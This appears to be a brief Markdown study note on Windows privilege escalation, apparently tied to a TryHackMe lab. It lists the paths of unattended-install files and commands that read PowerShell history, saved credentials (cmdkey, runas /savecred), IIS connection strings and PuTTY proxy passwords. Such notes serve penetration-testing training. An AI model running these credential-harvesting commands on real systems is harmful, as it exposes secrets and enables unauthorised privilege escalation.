# Windows Privilege Escalation

## Unattended Windows Installations

-   C:\Unattend.xml
-   C:\Windows\Panther\Unattend.xml
-   C:\Windows\Panther\Unattend\Unattend.xml
-   C:\Windows\system32\sysprep.inf
-   C:\Windows\system32\sysprep\sysprep.xml

```powershell
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell History

```CMD 
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`

## Saved Windows Credentials

```powershell
cmdkey /list
```

```powershell
runas /savecred /user:admin cmd.exe
```

## IIS Configuration

-   C:\inetpub\wwwroot\web.config
-   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

